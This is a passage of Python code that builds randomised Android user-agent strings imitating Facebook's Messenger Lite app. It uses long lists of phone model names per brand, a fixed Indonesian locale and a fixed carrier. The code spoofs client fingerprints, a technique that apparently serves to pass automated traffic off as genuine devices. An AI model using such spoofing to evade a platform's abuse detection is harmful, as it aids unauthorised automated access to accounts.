'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Realme;FBBD/Realme;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Asus" in str(self.device):
                self.android_model = random.choice(['ME171', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'ME371MG', 'K01N', 'K012', 'K00E', 'K019', 'K00Z', 'K00Z', 'K016', 'K016', 'K00G', 'K00G', 'K50IJ', 'ME172V', 'ME172V', 'ME172V', 'ME172V', 'K00F', 'K01E', 'K00R', 'K017', 'K013', 'K007', 'K01A', 'ASUS MeMO Pad 7', 'K015', 'K011', 'K00L', 'ME302C', 'ME302C', 'ME302C', 'AOSP on Duma', 'ME302KL', 'ME302KL', 'K00U', 'ME173X', 'ME173X', 'ME173X', 'ME173X', 'ASUS K00S', 'ME301T', 'ME301T', 'ME301T', 'PadFone', 'PadFone', 'PadFone 2', 'PadFone 2', 'PadFone T008', 'PadFone T008', 'PadFone T004', 'ASUS_T00E', 'PadFone T00C', 'Padfone t00c', 'PadFone T00C', 'ASUS_T00N', 'ASUS PadFone X', 'ASUS_T00T', 'ASUS_Z01QD', 'ZS600KL', 'ASUS_I001DE', 'ZS660KL', 'ASUS_I001DA', 'ASUS_I001DC', 'ZS660KL', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I005DA', 'ASUS_I005DC', 'ASUS_AI2201_C', 'ASUS_AI2201_D', 'ASUS_AI2201_F', 'ASUS_AI2203_D', 'ASUS_AI2203_C', 'ASUS_AI2203_B', 'ASUS TAB A8', 'Tinker Board', 'Tinker Board 2', 'Tinker Board S', 'TX201LA', 'TX201LA', 'K010', 'K018', 'K018', 'TF300T', 'ASUS Pad TF300T', 'K01B', 'K00C', 'K00C', 'ASUS XPad 10LTE', 'ASUS Z101', 'ASUS Z101 Prime', 'ASUS_Z008D', 'ASUS_Z00AD', 'Z00D', 'ASUS_Z00LD', 'ASUS_Z00ED', 'ASUS_Z00RD', 'ASUS ZenFone 2E', 'ASUS_Z012D', 'ZE520KL', 'ASUS_Z017D', 'ASUS_Z012DA', 'ASUS_Z017DA', 'ASUS_Z012S', 'ASUS_Z012DE', 'ASUS_Z01FD', 'ASUS_Z016S', 'ZS550KL', 'ASUS_Z01BD', 'ASUS_Z01BS', 'ZC551KL', 'ASUS_Z01BDB', 'ASUS_X00DDB', 'ASUS_X008D', 'ASUS_X00DDA', 'ZC553KL', 'ASUS_X008DB', 'ASUS_A001', 'ASUS_Z01HDA', 'ZE553KL', 'ASUS_X00LD', 'ASUS_Z01KDA', 'ASUS_Z01KS', 'ASUS_X00LDB', 'ASUS_T00I', 'ASUS_X00HD', 'ASUS_X00ID', 'ZC554KL', 'ASUS_X015D', 'ASUS_X015D', 'ASUS_Z01GS', 'ASUS_Z01GD', 'ASUS_X00LDA', 'ZD553KL', 'ASUS_Z01MD', 'ASUS_Z01MDA', 'ZD552KL', 'ASUS_X00QD', 'ASUS_X00QD', 'ASUS_T00J', 'ASUS_X00QSA', 'ZE620KL', 'ASUS_T00F', 'ASUS_T00F', 'ASUS_T00K', 'ASUS_X017DA', 'ASUS_T00P', 'ASUS_Z01RD', 'ASUS_Z01RD', 'Zenfone 5Z', 'ZS620KL', 'ASUS_T00G', 'ASUS_I01WD', 'ASUS_T00G', 'ASUS_Z002', 'ZS630KL', 'ASUS_I002D', 'ZS670KS', 'ZS671KS', 'ASUS_I006D', 'ASUS_I004D', 'ASUS_AI2202', 'ASUS_AI2202_B', 'ASUS_A002', 'ASUS_A002A', 'ASUS_Z007', 'ASUS_X00ADA', 'ASUS_X00BD', 'ASUS_X007D', 'ZB500KL', 'ASUS_Z00SD', 'ZB551KL', 'ASUS_L001', 'ZB500KG', 'ASUS_Z00VD', 'ASUS_X013DA', 'ASUS_X013D', 'ASUS_X014D', 'ASUS_X014D', 'ASUS_X013DB', 'G550KL', 'G550KL', 'G553KL', 'ASUS_Z00YD', 'ASUS_A007', 'ASUS_X00RD', 'G552KL', 'ASUS_Z010DD', 'ASUS_Z010DB', 'ASUS_Z010D', 'ASUS_Z010DA', 'ASUS_X00PD', 'ZB555KL', 'ASUS_X01AD', 'ZB633KL', 'ASUS_X018D', 'ASUS_X018DC', 'ASUS_X00TD', 'ASUS_X00TDB', 'ASUS_X00TDE', 'ZB602KL', 'ASUS_X01BDA', 'ASUS_A001D', 'ASUS_X002', 'ASUS_X003', 'ASUS_X003', 'ASUS_X550', 'ASUS_X00GD', 'ASUS_X005', 'ASUS_Z00UDB', 'ASUS_Z00UD', 'ASUS_A006', 'ASUS_A009', 'ASUS_Z00XS', 'P01T_1', 'P021', 'P00L', 'P00C', 'P028', 'P027', 'ASUS_P00I', 'P001', 'P008', 'ASUS_P00J', 'ASUS ZenWatch', 'ASUS ZenWatch 2'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/ASUS;FBBD/ASUS;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Lenovo" in str(self.device):
                self.android_model = random.choice(['lenovo1023', 'Lenovo 1023', 'Lenovo 3056', 'Lenovo 3300A', 'Lenovo 76S', 'Lenovo 8389', 'Lenovo A 319', 'Lenovo A1010a20', 'Lenovo A1000', 'IdeaTabA1000L-F', 'Lenovo A1000', 'Lenovo-A101', 'Lenovo A1900', 'Lenovo A2010l36', 'Lenovo_a2010', 'Lenovo A2010l36/S100', 'Lenovo A2016b31', 'A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2107', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2580', 'Lenovo-A269i/S001', 'id Lenovo_A269i', 'Lenovo A2860', 'Lenovo A288t', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo A308t', 'Lenovo A316', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo_A318t', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A320t', 'Lenovo A328', 'Lenovo A328t', 'Lenovo A328', 'Lenovo A330e', 'Lenovo A330e', 'Lenovo A338T', 'Lenovo A338t', 'Lenovo A355e', 'Lenovo A358t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A368t', 'Lenovo A3690', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'id Lenovo_A369i', 'Lenovo A378t', 'Lenovo A378t', 'Lenovo A3860', 'Lenovo A388t', 'Lenovo A3900', 'Lenovo A3910t30', 'Lenovo A396', 'Lenovo A398t', 'Lenovo A399', 'Lenovo A399', 'Lenovo A399', 'Lenovo A4526', 'L18011', 'Lenovo L18011', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A516', 'Lenovo A516', 'Lenovo A516', 'Lenovo-A516/S111', 'Lenovo A516', 'Lenovo A520/S101', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A529', 'Lenovo A529', 'Lenovo A536', 'Lenovo A536', 'Lenovo A536', 'Lenovo A560', 'Lenovo A560', 'Lenovo A560/JLS36C', 'Lenovo A5600', 'Lenovo A5600', 'LNV-Lenovo_A560e', 'Lenovo A5860', 'LenovoA588t', 'Lenovo A590', 'Lenovo L18081', 'Lenovo L19041', 'Lenovo A6000', 'Lenovo A6000', 'Lenovo A6000 Plus', 'Lenovo A6010', 'Lenovo A6010', 'Lenovo A6010Pro', 'Lenovo A606', 'Lenovo A606', 'Lenovo A616', 'Lenovo A630', 'Lenovo A630/S001', 'Lenovo A630t', 'Lenovo A630t', 'Lenovo A656', 'Lenovo A66/S001', 'Lenovo A660', 'Lenovo A660', 'Lenovo A660', 'Lenovo A6600', 'Lenovo A6600d40', 'Lenovo A6600a40', 'Lenovo A670t', 'Lenovo A680', 'Lenovo A680', 'Lenovo A680_ROW', 'Lenovo A6800', 'Lenovo A688t', 'Lenovo A690', 'Lenovo A690/S001', 'Lenovo L19111', 'Lenovo A7000 Plus', 'Lenovo A7000a', 'Lenovo A706', 'LENOVO A706', 'Lenovo_A706/JZO54K', 'Lenovo A708t', 'Lenovo A750', 'Lenovo A750', 'Lenovo A760', 'Lenovo A760', 'Lenovo_A766/JOP40D', 'Lenovo A768t', 'Lenovo A7700', 'Lenovo A788t', 'Lenovo A788t', 'Lenovo A789', 'lenovo A789', 'LENOVO A789', 'Lenovo L10041', 'Lenovo A800', 'Lenovo A800', 'Lenovo A805e', 'Lenovo A808', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A816', 'Lenovo A816', 'Lenovo A820', 'Lenovo A820', 'Lenovo A820', 'Lenovo_A820', 'lenovoA820c', 'Lenovo A820e', 'Lenovo A820t', 'Lenovo A828t', 'Lenovo A828t', 'Lenovo A830', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'lenovoA850c', 'Lenovo A850i', 'Lenovo A858t', 'LENOVO A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A889', 'Lenovo A889', 'Lenovo A889', 'Lenovo A916', 'Lenovo A916', 'Lenovo_A916', 'Lenovo A916', 'Lenovo A938t', 'Lenovo A2016b30', 'Lenovo K10a40', 'Lenovo D101', 'Lenovo-D101', 'd-42A', 'Lenovo TB-X104F', 'Lenovo TB-X104L', 'Lenovo G756', 'Lenovo A806', 'Lenovo A936', 'Lenovo A936', 'Lenovo_A936', 'Lenovo H75676', 'Lenovo I5', 'Lenovo-I960', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'Ideapad K1', 'Ideapad K1', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-T', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-F', 'IdeaTab A2107A-F', 'IdeaTab A2107A-F', 'IdeaTabA2109A', 'IdeaTabA2109A', 'A2109A', 'IdeaTabA2109A', 'IdeaTabA2207A-H', 'IdeaTab A3000-H', 'IdeaTab A3000-H', 'Lenovo A3000-H', 'Lenovo A3000-H', 'IdeaTabA5000-E', 'IdeaTab_A5000-E', 'Lenovo B8080-H', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2110AH', 'Lenovo S5000-F', 'Lenovo S5000-H', 'Lenovo S5000-H/JDQ39', 'Lenovo S6000-H', 'IdeaTab S6000-H', 'IdeaTab S6000-F', 'ar_AE Lenovo K10', 'Lenovo K10 Note', 'Lenovo L39051', 'Lenovo K10e70', 'Lenovo K10e70', 'Lenovo L38083', 'Lenovo L38082', 'Lenovo K11', 'Lenovo K11 Power', 'Lenovo K12', 'Lenovo XT2081-4', 'Lenovo K12 Note', 'Lenovo K12 Pro', 'Lenovo K13', 'Lenovo K13 Note', 'Lenovo K13 Pro', 'Lenovo K14', 'Lenovo K14 Note', 'Lenovo K14 Plus', 'Lenovo K15 Plus', 'Lenovo K30-W', 'Lenovo K50a40', 'Lenovo K50-t5', 'Lenovo K50-T5', 'K31-t3', 'Lenovo K31-t3', 'Lenovo K320t', 'arm Lenovo K320t', 'Lenovo K32c30', 'Lenovo K32c36', 'Lenovo K32c36', 'Lenovo K33', 'Lenovo K33b37', 'MZ-Lenovo K3note', 'Lenovo K4', 'Lenovo A7010a48', 'K350t', 'Lenovo A7020a48', 'Lenovo A7020a40', 'Lenovo K52e78', 'Lenovo L38012', 'Lenovo L38011', 'en Lenovo L38011', 'Lenovo L38011', 'Lenovo L38041', 'Lenovo K5 Pro', 'Lenovo_K50_T5', 'Lenovo K52t38', 'Lenovo K52t58', 'Lenovo K53', 'Lenovo K53b36', 'Lenovo L38031', 'Lenovo K33b36', 'Lenovo K33a48', 'Lenovo K53a48', 'Lenovo K33a42', 'Lenovo_K33a42', 'lenovoK7', 'Lenovo K8', 'Lenovo K8 Note', 'Lenovo K8 Plus', 'Lenovo K8 Plus', 'Lenovo K80M', 'Lenovo K80M', 'Lenovo_K80M', 'Lenovo K860', 'Lenovo L38043', 'Lenovo L38043', 'Lenovo K900', 'Lenovo K900', 'Lenovo_K900_ROW', 'Lenovo K910', 'Lenovo K910', 'Lenovo K910e', 'Lenovo L79041', 'Lenovo L70081', 'Lenovo L79031', 'Lenovo L79031', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo TB-9707F', 'Lenovo L71061', 'VR-1541F', 'TB-X704A', 'Lenovo TB-X704A', 'Lenovo N300', 'Lenovo N300', 'Lenovo N308', 'Lenovo Note 5', 'lenovo P01k000', 'Lenovo_P1m', 'Lenovo P1m', 'Lenovo P2a42', 'Lenovo P2a42', 'Lenovo P2c72', 'Lenovo P2c72', 'Lenovo P70', 'Lenovo P70', 'Lenovo p70', 'Lenovo P700', 'Lenovo P700i', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P780', 'Lenovo P780', 'Lenovo P780', 'Lenovo P90', 'Lenovo P90', 'Lenovo-P960', 'Lenovo PB1-750M', 'Lenovo PB2-650M', 'Lenovo PB2-670M', 'Lenovo PB1-770M', 'Lenovo S1c58', 'Lenovo S1L a40', 'Lenovo K520', 'Lenovo K520', 'Lenovo L58041', 'Lenovo L58091', 'Lenovo S580', 'Lenovo S580', 'Lenovo S60-a', 'Lenovo S60-a', 'Lenovo S60A', 'Lenovo S650', 'Lenovo S650', 'Lenovo S650', 'Lenovo S658t', 'Lenovo S660', 'LenovoS668T', 'Lenovo S668T', 'Lenovo S668t', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720i', 'Lenovo S720i', 'Lenovo S750', 'lenovo s750', 'Lenovo S750', 'Lenovo S810t', 'Lenovo S820', 'Lenovo S820', 'Lenovo S820', 'lenovo S820c', 'Lenovo S820e', 'Lenovo S850', 'Lenovo S850t', 'Lenovo S856', 'Lenovo S858t', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860/JDQ39', 'LNV-Lenovo S870e', 'Lenovo S880', 'Lenovo S880', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo-S890/S100', 'Lenovo S898t', 'Lenovo S898t /V1.5', 'Lenovo s898t', 'Lenovo S90A', 'LenovoS90C', 'Lenovo S920', 'Lenovo S920', 'Lenovo S920/V1.5', 'Lenovo S930', 'Lenovo S938t', 'Lenovo S939', 'Lenovo S939', 'Lenovo S960', 'Lenovo S960', 'Lenovo TB-8505FS', 'Lenovo TB-8505XS', 'Lenovo TAB 2 A10-70L', 'Lenovo TAB 2 A7-30HC', 'Lenovo TAB 2 A7-30DC', 'Lenovo TAB 2 A7-30GC', 'Lenovo TB-8504F', 'Lenovo TB-8704F', 'A101LV', 'Lenovo TB-7504X', 'Lenovo TB-7504X', 'Lenovo TB-7304X', 'Lenovo TB-7304I', 'Lenovo TB-7304F', 'Lenovo TB-7104F', 'Lenovo TB-7104I', 'Lenovo TB-8304F1', 'Lenovo TB-8304F1', 'Lenovo TB-X6C6F', 'Lenovo TB-X6C6X', 'Lenovo TB-J606N', 'Lenovo TB-J607Z', 'Lenovo TB-X505F', 'Lenovo TB-X505X', 'Lenovo TB-X505L', 'Lenovo TB-X605F', 'TB328FU', 'TB328XU', 'Lenovo TB-X605L', 'Lenovo TB-X605M', 'Lenovo TB-X606XA', 'Lenovo TB-X606F', 'Lenovo TB-X605LC', 'Lenovo TB-X605FC', 'Lenovo TB-X306FA', 'Lenovo TB-X306X', 'Lenovo TB125FU', 'Lenovo TB128XU', 'TB128FU', 'Lenovo TB-7305X', 'Lenovo TB-7305X', 'Lenovo TB-7305F', 'Lenovo TB-7305I', 'Lenovo TB-7306F', 'Lenovo TB-7306X', 'Lenovo TB-8506F', 'Lenovo TB-8506FS', 'Lenovo TB-8506X', 'Lenovo TB-8705F', 'Lenovo TB-X705L', 'Lenovo TB-X705F', 'Lenovo TB-J606F', 'Lenovo TB-J606L', 'TB350FU', 'Lenovo TB-J616F', 'Lenovo TB-J616X', 'Lenovo TB-J706F', 'Lenovo TB-J706L', 'TB132FU', 'Lenovo TB-Q706F', 'Lenovo TB-Q706Z', 'Lenovo TB-J607F', 'Lenovo PB-6505M', 'Lenovo PB-6505Y', 'Lenovo TB3-X70F', 'Lenovo TB3-X70L', 'Lenovo TB3-730X', 'Lenovo TB3-710I', 'Lenovo TB3-710F', 'Lenovo TB-7703X', '601LV', 'Lenovo TB3-850M', 'Lenovo TB3-850F', '602LV', 'Lenovo TB-8703X', 'Lenovo TB-8703F', 'Lenovo TB-X304L', 'Lenovo TB-X304F', 'Lenovo TB-X704L', 'Lenovo TB-X704F', '701LV', 'Lenovo TB-8504X', 'Lenovo TB-8704X', 'Lenovo TB-8X04F', 'Lenovo TB350XU', 'Lenovo ThinkPad 13', 'ThinkPadTablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'Lenovo A1000m', 'Lenovo vibe a plus', 'Lenovo A2016a40', 'Lenovo A2016a40', 'Lenovo A2020a40', 'VIBE C', 'Lenovo A6020a41', 'Lenovo A6020l36', 'Lenovo A6020a40', 'Lenovo A6020l37', 'Lenovo A6020a46', 'Vibe K5 Plus', 'Lenovo P1a42', 'Lenovo P1c58', 'Lenovo P1a41', 'Vibe P1 Turbo', 'Lenovo P1ma40', 'Lenovo S1c50', 'Lenovo S1a40', 'Lenovo S1La40', 'VIBE_S2i', 'VIBE S3i', 'VIBE S5i', 'VIBE S6i', 'VIBE S6i Plus', 'VIBE S7i', 'Lenovo Z90a40', 'Lenovo Z90-7', 'VIBE V7', 'Lenovo X2-AP', 'Lenovo X2-TO', 'Lenovo X2-TO', 'Lenovo X3c70', 'Lenovo X3c50', 'Lenovo X3a40', 'Lenovo K51c78', 'Lenovo K51c78', 'Lenovo X3 Lite', 'Lenovo K910L', 'Lenovo K910L', 'Lenovo Vibe Z2', 'Lenovo K920', 'Lenovo X2-EU', 'Lenovo X2-EU', 'lenovo x606fa', 'TB138FC', 'Lenovo YT3-X90X', 'Lenovo YT3-X90L', 'Lenovo YT3-X90F', 'Lenovo YB-Q501F', 'Lenovo YB1-X90F', 'Lenovo YB1-X90L', 'Lenovo YT-K606F', 'Lenovo YT-X705L', 'Lenovo YT-X705X', 'Lenovo YT-X705F', 'Lenovo YT-J706F', 'Lenovo YT-J706X', 'Lenovo YT3-X50F', 'Lenovo YT3-X50L', 'Lenovo YT3-X50M', 'Lenovo YT3-850M', 'Lenovo YT3-850M', 'Lenovo YT3-850F', 'Lenovo YT3-850L', 'Lenovo YT-X703F', 'Lenovo YT-X703L', 'Lenovo B8000-H', 'Lenovo B8000-F', 'Yoga Tablet 2', 'Lenovo B6000-F/JDQ39', 'Lenovo B6000-HV', 'Lenovo Z2', 'Lenovo Z2', 'Z2 Plus', 'Lenovo Z2w', 'Lenovo L78011', 'Lenovo L78031', 'Lenovo Z5 Pro', 'Lenovo L78032', 'Lenovo L78071', 'Lenovo L78071', 'Lenovo Z5s', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo Z6 Lite', 'Lenovo L78051', 'Lenovo L38111', 'ZUK Z2151', 'ZUK Z2151', 'ZUK Z1', 'ZUK Z2132', 'ZUK Z2132', 'ZUK Z2131', 'ZUK Z2121'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Lenovo;FBBD/Lenovo;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Oneplus" in str(self.device):
                self.android_model = random.choice(['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Oneplus;FBBD/Oneplus;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Advan" in str(self.device):
                self.android_model = random.choice(['5041', '5041', '5058', '5059', '5059', '5061', '5062', '5062', 'E1C_3G', 'E1C_3G', 'E1C Pro', '6004', '6002', '6002', '6201', 'i7U', 'i7U', 'i4U', 'i4U', 'i55D', 'i55D', 'i55K', 'i55K', 'i5C', 'i5C', 'i5C', 'I5E', 'i5E', 'i5E', 'i5K', 'i5K', 'i7A', 'I7D', 'I7D', 'ADVAN M4', '5202', '5505', '5505', 'ADVAN S40', 'ADVAN S40', 'S45E', 'S4Z', 'S4Z', 'S4Z', 'S4Z', 'i5G', 'S50H', 'S5E_NXT', 'S5E_NXT', 'S5E_NXT', 'S7D', 'S7D', 'ADVAN 1011', 'ADVAN T5C'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/ADVAN;FBBD/ADVAN;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Poco" in str(self.device):
                self.android_model = random.choice(['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/POCO;FBBD/POCO;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Evercoss" in str(self.device):
                self.android_model = random.choice(['M50 STAR', 'A75 MAX', 'AT8B', 'A75 MAX', 'S55A', 'R70A'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Evercoss;FBBD/Evercoss;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            else:
                self.android_model = random.choice(['Nokia 1', 'Nokia 1 Plus', 'Nokia 1011', 'Nokia 105', 'Nokia 2.1', 'Nokia 2 V', 'Nokia 2 V Tella', 'TA-1032', 'TA-1020', 'TA-1032', 'Nokia 3 V', 'Nokia_3310_4G', 'Nokia 3310', 'NOKIA 3310', 'Nokia 4', 'TA-1053', 'TA-1024', 'TA-1021', 'TA-1021', 'TA-1033', 'TA-1000', 'Nokia 1.3', 'TA-1041', 'Nokia 7', 'TA-1041', 'TA-1041', 'Nokia 7 plus', 'Nokia 7 plus', 'TA-1004', 'TA-1012', 'TA-1012', 'TA-1052', 'Nokia 8 Sirocco', 'Nokia 8910i', 'Nokia 8 V 5G UW', 'Nokia 9', 'Nokia C01 Plus', 'Nokia C01 Plus', 'Nokia C02', 'Nokia C1', 'es Nokia C1 Plus', 'Nokia C1', 'Nokia C1 Plus', 'Nokia C1 2nd Edition', 'Nokia C1', 'Nokia C1', 'Nokia C10', 'N152DL', 'Nokia C100', 'Nokia C12', 'Nokia C12 Pro', 'Nokia C2', 'Nokia C2', 'Nokia 